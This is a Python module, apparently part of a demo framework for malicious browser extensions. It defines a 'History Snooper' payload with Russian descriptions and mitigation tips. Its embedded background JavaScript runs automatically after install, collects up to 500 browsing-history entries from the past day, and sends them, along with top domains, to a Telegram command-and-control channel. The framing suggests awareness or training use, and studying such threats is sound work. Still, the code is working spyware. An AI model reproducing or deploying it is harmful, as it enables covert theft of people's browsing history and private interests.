from .base import BasePayload, Payload


class HistorySnooper(BasePayload):
    def get_payload(self) -> Payload:
        return Payload(
            id="history_snooper",
            name="History Snooper",
            description="Читает историю браузера. Отправляет в Telegram.",
            icon="📜",
            risk_level="high",
            permissions=["history", "tabs", "storage"],
            targets=["browsing history", "visited sites", "search queries", "interests"],
            demo_instructions="1. Установите\n2. Посетите сайты\n3. История придёт в Telegram",
            mitigation=[
                "Режим инкогнито для чувствительных запросов",
                "Регулярно очищайте историю",
                "Проверяйте разрешения расширений",
                "Отдельные профили для работы/личного",
            ],
        )

    def get_background_js(self) -> str:
        return r"""
// ============================================================
// History Snooper — C2
// ============================================================

console.log('[DEMO] History Snooper: background loaded');

async function analyzeHistory() {
    try {
        const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;

        const historyItems = await chrome.history.search({
            text: '',
            startTime: oneDayAgo,
            maxResults: 500,
        });

        const items = historyItems.map(h => ({
            url: h.url,
            title: h.title,
            lastVisitTime: h.lastVisitTime,
            visitCount: h.visitCount,
        }));

        const domains = {};
        for (const item of items) {
            try {
                const url = new URL(item.url);
                domains[url.hostname] = (domains[url.hostname] || 0) + 1;
            } catch (e) {}
        }

        const topDomains = Object.entries(domains)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 20);

        console.log(`[DEMO] History: ${items.length} items`);

        chrome.action.setBadgeText({ text: String(items.length) });
        chrome.action.setBadgeBackgroundColor({ color: '#FF9800' });

        chrome.storage.local.set({
            demo_history_count: items.length,
            demo_history_items: items,
        });

        // C2
        if (typeof C2_CONFIG !== 'undefined' && C2_CONFIG.enabled) {
            let text = `📜 <b>History Snooper</b>\n`;
            text += `Сессия: <code>${C2_CONFIG.sessionId}</code>\n`;
            text += `Записей: <b>${items.length}</b>\n`;
            text += `Доменов: <b>${Object.keys(domains).length}</b>\n\n`;
            text += `<b>Топ доменов:</b>\n`;

            for (const [domain, count] of topDomains.slice(0, 15)) {
                text += `  🌐 <code>${c2Escape(domain)}</code> — ${count}\n`;
            }

            const jsonData = {
                session_id: C2_CONFIG.sessionId,
                timestamp: new Date().toISOString(),
                total: items.length,
                total_domains: Object.keys(domains).length,
                items: items,
                by_domain: domains,
            };
            const filename = `history_${C2_CONFIG.sessionId}_${Date.now()}.json`;
            c2SendDocument(filename, JSON.stringify(jsonData, null, 2));

            c2Send(text);
        }

        return items;
    } catch (e) {
        console.error('[DEMO] History error:', e);
        return [];
    }
}

chrome.runtime.onInstalled.addListener(() => {
    setTimeout(analyzeHistory, 5000);
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.action === 'analyze_history') {
        analyzeHistory().then(sendResponse);
        return true;
    }
    if (msg.action === 'get_history_stats') {
        chrome.storage.local.get(['demo_history_count'], (data) => sendResponse(data));
        return true;
    }
});
"""

    def get_content_js(self) -> str:
        return """
console.log('[DEMO] History Snooper: content loaded on', location.hostname);
"""

    def get_popup_js(self) -> str:
        return """
chrome.runtime.sendMessage({ action: 'get_history_stats' }, (data) => {
    if (data && data.demo_history_count) {
        const el = document.getElementById('demo-count');
        if (el) el.textContent = data.demo_history_count;
    }
});
"""


__all__ = ["HistorySnooper"]
